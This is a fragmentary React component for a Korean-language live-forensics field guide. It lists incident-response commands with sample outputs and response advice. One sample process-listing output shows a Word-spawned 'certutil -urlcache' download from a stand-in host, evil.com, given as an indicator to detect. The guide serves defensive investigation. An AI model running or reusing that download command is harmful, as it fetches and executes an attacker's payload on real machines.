...
C:\\Staging\research_archive.7z                     2024-09-10 22:28:30   487221843`,
  ...
  {
    id:"account", label:"👤 계정 & 권한 확인", color:"#ff9f43",
    desc:"로컬·도메인 계정 상태, 그룹 멤버십, 최근 로그온 이력을 빠르게 확인.",
    items:[
      {
        name:"로컬 계정 목록 전체",
        type:"cmd", threat:true,
...
Administrator    backup_admin    ← 의심! 정상 DA가 아님`,
  ...
  {
    id:"process", label:"⚙️ 프로세스 & 서비스", color:"#ffd166",
    desc:"실행 중인 악성 프로세스, 비정상 서비스, 자동 시작 항목을 빠르게 식별.",
    items:[
      {
        name:"비정상 경로 프로세스 탐지",
        type:"powershell", threat:true,
...
4392  cmd.exe        WINWORD.EXE   3824       cmd /c certutil -urlcache -f http://evil.com/a.exe`,
  ...
  {
    id:"network", label:"🌐 네트워크 & 연결", color:"#4cc9f0",
...
Get-NetNeighbor | Where-Object {$_.State -eq 'Reachable'}`,
  ...
  {
    id:"persistence", label:"🔒 지속성 & 변조", color:"#d2a8ff",
...
HKEY_LOCAL_MACHINE\...\Lsa
  ...
  {
    id:"memory", label:"💾 휘발성 데이터 수집", color:"#06d6a0",
    desc:"전원 종료 시 사라지는 휘발성 정보. 분석 전 반드시 먼저 수집.",
    items:[
      {
        name:"메모리 덤프 수집 (전체)",
...
export default function ArtifactGuide() {
  ...
  return (
    <div style={{ minHeight:"100vh", maxWidth:480, margin:"0 auto", background:"#010409", fontFamily:"'Noto Sans KR','Segoe UI',sans-serif", color:"#e6edf3", display:"flex", flexDirection:"column" }}>
      ...
      {/* ── 최상단 모드 탭 ── */}
      <div style={{ background:"#0d1117", borderBottom:"1px solid #21262d", padding:"8px 10px", display:"flex", gap:5, position:"sticky", top:0, zIndex:60 }}>
        <button onClick={() => setMode("eventlog")} style={{
          ...
          fontSize:10, fontWeight:700, display:"flex", flexDirection:"column", alignItems:"center", gap:1,
        }}><span style={{fontSize:13}}>📋</span>이벤트</button>
        <button onClick={() => setMode("registry")} style={{
          ...
          fontSize:10, fontWeight:700, display:"flex", flexDirection:"column", alignItems:"center", gap:1,
        }}><span style={{fontSize:13}}>🗝</span>레지스트리</button>
        <button onClick={() => setMode("artifact")} style={{
          ...
          fontSize:10, fontWeight:700, display:"flex", flexDirection:"column", alignItems:"center", gap:1,
        }}><span style={{fontSize:13}}>🗂</span>아티팩트</button>
        <button onClick={() => setMode("live")} style={{
          flex:1, padding:"7px 2px", borderRadius:8, border:"none", cursor:"pointer",
          background:mode==="live"?"#ff4d6d33":"#161b22",
          color:mode==="live"?"#ff4d6d":"#8b949e",
          border:`1px solid ${mode==="live"?"#ff4d6d55":"#30363d"}`,
          fontSize:10, fontWeight:700, display:"flex", flexDirection:"column", alignItems:"center", gap:1,
        }}><span style={{fontSize:13}}>🚨</span>라이브</button>
      </div>
...
// ── 라이브 포렌식 모드 컴포넌트 ──────────────────────────────
function LiveForensicsMode() {
  const [selCat, setSelCat]     = useState(LIVE_CATEGORIES[0].id);
  const [selItem, setSelItem]   = useState(null);
  const [sheetTab, setSheetTab] = useState("cmd");
  const [copied, setCopied]     = useState(null);

  const cat = LIVE_CATEGORIES.find(c => c.id === selCat);

  const TYPE_META = {
    cmd:        { label:"CMD",        color:"#4cc9f0", bg:"#4cc9f015" },
    powershell: { label:"PowerShell", color:"#d2a8ff", bg:"#d2a8ff15" },
    gui:        { label:"GUI",        color:"#ffd166", bg:"#ffd16615" },
    tool:       { label:"Tool",       color:"#06d6a0", bg:"#06d6a015" },
  };
  ...
  return (
    <>
      {/* 헤더 */}
      <div style={{ background:"#0d1117", borderBottom:"1px solid #21262d", padding:"11px 14px", position:"sticky", top:49, zIndex:50 }}>
        <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:9 }}>
          <span style={{ fontSize:18 }}>🚨</span>
          <div>
            <div style={{ fontWeight:800, fontSize:13, color:"#ff4d6d" }}>라이브 포렌식 — 현장 대응</div>
            <div style={{ color:"#8b949e", fontSize:10 }}>전원 유지 상태에서 휘발성 정보 우선 수집</div>
          </div>
        </div>
        {/* 카테고리 탭 — 가로 스크롤 */}
        <div style={{ display:"flex", gap:5, overflowX:"auto", paddingBottom:2 }}>
          {LIVE_CATEGORIES.map(c => (
            <button key={c.id} onClick={() => setSelCat(c.id)} style={{
              padding:"5px 10px", borderRadius:20, border:"none", cursor:"pointer", flexShrink:0,
              background: selCat===c.id ? c.color+"33" : "#21262d",
              color: selCat===c.id ? c.color : "#8b949e",
              border:`1px solid ${selCat===c.id ? c.color+"55" : "#30363d"}`,
              fontSize:10, fontWeight:700,
            }}>{c.label}</button>
          ))}
        </div>
      ...
      <div style={{ padding:"10px 14px 0" }}>
        <div style={{ background:cat.color+"10", border:`1px solid ${cat.color}30`, borderLeft:`3px solid ${cat.color}`, borderRadius:8, padding:"9px 12px", marginBottom:10 }}>
          <div style={{ color:cat.color, fontSize:11, lineHeight:1.6 }}>{cat.desc}</div>
        </div>
      </div>

      {/* 항목 카드 목록 */}
      <div style={{ flex:1, padding:"0 14px 90px" }}>
        {cat.items.map((item, i) => {
          const tm = TYPE_META[item.type] || TYPE_META.cmd;
          return (
            <button key={i} onClick={() => openItem(item)} style={{
              width:"100%", textAlign:"left",
              background:item.threat ? "#ff4d6d08" : "#161b22",
              border:`1px solid ${item.threat ? "#ff4d6d33" : "#21262d"}`,
              borderLeft:`4px solid ${item.threat ? "#ff4d6d" : cat.color}`,
              borderRadius:10, padding:"12px 13px", marginBottom:7, cursor:"pointer",
              display:"flex", gap:10, alignItems:"flex-start",
            }}>
              <div style={{ flex:1 }}>
                <div style={{ display:"flex", alignItems:"center", gap:6, flexWrap:"wrap", marginBottom:4 }}>
                  ...
                  <span style={{
                    ...
                    borderRadius:4, padding:"1px 6px", fontSize:9, fontWeight:800, flexShrink:0,
                  }}>{tm.label}</span>
                  <span style={{ color:item.threat ? "#ffaaaa" : "#e6edf3", fontWeight:700, fontSize:12 }}>{item.name}</span>
                  {item.threat && (
                    <span style={{ background:"#ff4d6d22", color:"#ff4d6d", borderRadius:4, padding:"1px 5px", fontSize:9, fontWeight:700 }}>⚠</span>
                  )}
                </div>
                <div style={{ color:"#8b949e", fontSize:11, lineHeight:1.5 }}>{item.desc}</div>
              </div>
      ...
      {/* ── 항목 상세 바텀시트 ── */}
      {selItem && (() => {
        const tm = TYPE_META[selItem.type] || TYPE_META.cmd;
        return (
          <div onClick={() => setSelItem(null)}
            style={{ position:"fixed", inset:0, background:"#00000090", zIndex:200, display:"flex", alignItems:"flex-end" }}>
            <div onClick={e => e.stopPropagation()} style={{
              background:"#161b22",
              ...
              <div style={{ marginBottom:12 }}>
                <div style={{ display:"flex", gap:6, alignItems:"center", flexWrap:"wrap", marginBottom:5 }}>
                  ...
                  {selItem.threat && (
                    <span style={{ background:"#ff4d6d22", color:"#ff4d6d", borderRadius:4, padding:"2px 7px", fontSize:10, fontWeight:700 }}>⚠ 위협 지표 확인</span>
                  )}
                </div>
                <div style={{ fontWeight:800, fontSize:15, color:"#e6edf3", marginBottom:4 }}>{selItem.name}</div>
                <div style={{ color:"#8b949e", fontSize:12, lineHeight:1.6 }}>{selItem.desc}</div>
              ...
              <div style={{ display:"flex", gap:0, borderBottom:"1px solid #21262d", marginBottom:12 }}>
                {[
                  { id:"cmd",    label:"💻 명령어" },
                  { id:"output", label:"📊 출력 예시" },
                  { id:"why",    label:"💡 의미 & 활용" },
                ].map(t => (
                  <button key={t.id} onClick={() => setSheetTab(t.id)} style={{
                    flex:1, padding:"9px 4px", border:"none", cursor:"pointer", background:"none",
                    color: sheetTab===t.id ? cat.color : "#8b949e",
                    borderBottom:`2px solid ${sheetTab===t.id ? cat.color : "transparent"}`,
                    fontSize:11, fontWeight:sheetTab===t.id ? 700 : 400,
                  }}>{t.label}</button>
                ))}
              </div>
              ...
              {sheetTab==="cmd" && (
                <div>
                  {selItem.type === "gui" ? (
                    <div style={{ background:"#ffd16610", border:"1px solid #ffd16630", borderRadius:8, padding:"10px 12px", marginBottom:8 }}>
                      <div style={{ color:"#ffd166", fontSize:10, fontWeight:700, marginBottom:5 }}>🖥 GUI 실행 방법</div>
                      <div style={{ color:"#e6edf3", fontSize:11, lineHeight:1.8, whiteSpace:"pre-line" }}>{selItem.cmd}</div>
                    </div>
                  ) : (
                    selItem.cmd.split('\n').filter(l => l.trim()).map((line, i) => {
                      const isComment = line.trim().startsWith('#');
                      if (isComment) return (
                        <div key={i} style={{ color:"#8b949e", fontSize:11, padding:"3px 0", fontStyle:"italic" }}>{line}</div>
                      );
                      return (
                        <div key={i} style={{ position:"relative", marginBottom:7 }}>
                          <div style={{
                            ...
                            fontFamily:"monospace", color: selItem.type==="powershell" ? "#d2a8ff" : "#4cc9f0",
                            fontSize:11, lineHeight:1.6, wordBreak:"break-all", whiteSpace:"pre-wrap",
                          }}>{line}</div>
                          <button onClick={() => copyCmd(line)} style={{
                            position:"absolute", right:6, top:"50%", transform:"translateY(-50%)",
                            background:"#21262d", border:"1px solid #30363d", borderRadius:5,
                            padding:"3px 7px", cursor:"pointer",
                            color: copied===line.slice(0,20) ? "#06d6a0" : "#8b949e",
                            fontSize:10, fontWeight:700,
                          }}>{copied===line.slice(0,20) ? "✓" : "복사"}</button>
                        </div>
                      );
                    })
                  )}
              ...
              {/* 출력 예시 탭 */}
              {sheetTab==="output" && (
                <div style={{ background:"#0d1117", border:"1px solid #30363d", borderRadius:8, padding:"12px" }}>
                  <pre style={{
                    color:"#e6edf3", fontSize:10, fontFamily:"monospace",
                    margin:0, lineHeight:1.8, whiteSpace:"pre-wrap", wordBreak:"break-all",
                  }}>{selItem.output}</pre>
                </div>
              )}
              ...
              {sheetTab==="why" && (
                <div style={{ display:"flex", flexDirection:"column", gap:8 }}>
                  <div style={{
                    ...
                    borderLeft:"3px solid #ffd166", borderRadius:8, padding:"11px 13px",
                  }}>
                    <div style={{ color:"#ffd166", fontWeight:700, fontSize:11, marginBottom:5 }}>💡 왜 확인하는가</div>
                    <div style={{ color:"#e6edf3", fontSize:12, lineHeight:1.7 }}>{selItem.why}</div>
                  </div>
                  <div style={{
                    background:cat.color+"0d", border:`1px solid ${cat.color}33`,
                    borderLeft:`3px solid ${cat.color}`, borderRadius:8, padding:"11px 13px",
                  }}>
                    <div style={{ color:cat.color, fontWeight:700, fontSize:11, marginBottom:5 }}>🔎 분석 포인트</div>
                    <div style={{ color:"#e6edf3", fontSize:12, lineHeight:1.7 }}>{selItem.desc}</div>
                  </div>
                  {selItem.threat && (
                    <div style={{
                      background:"#ff4d6d0d", border:"1px solid #ff4d6d33",
                      borderLeft:"3px solid #ff4d6d", borderRadius:8, padding:"11px 13px",
                    }}>
                      <div style={{ color:"#ff4d6d", fontWeight:700, fontSize:11, marginBottom:4 }}>⚠ 위협 지표 시 대응</div>
                      <div style={{ color:"#ffaaaa", fontSize:12, lineHeight:1.7 }}>
                        {selItem.id === "current_logon" || selItem.name.includes("로그온")
                          ? "비정상 세션 확인 → 공격자 활성 세션 여부 판단 → 격리 검토"
                          : selItem.name.includes("프로세스")
                          ? "의심 프로세스 확인 → 종료 전 메모리 덤프 수행 → 파일 해시 확인"
                          : selItem.name.includes("네트워크") || selItem.name.includes("연결")
                          ? "외부 IP 차단 검토 → WHOIS 조회 → C2 서버 여부 확인"
                          : selItem.name.includes("계정") || selItem.name.includes("관리자")
                          ? "백도어 계정 비활성화 → 그룹에서 제거 → 비밀번호 초기화"
                          : selItem.name.includes("Defender") || selItem.name.includes("방화벽")
                          ? "재활성화 전 증거 수집 완료 여부 확인 → 재활성화 → 격리 검토"
                          : "증거 수집 완료 후 → 시스템 격리 → 전문 분석 의뢰"}
                      </div>
                    </div>
                  )}
                </div>
              ...
              <button onClick={() => setSelItem(null)} style={{
                width:"100%", background:"#21262d", border:"none", borderRadius:9,
                padding:"11px", cursor:"pointer", color:"#e6edf3",
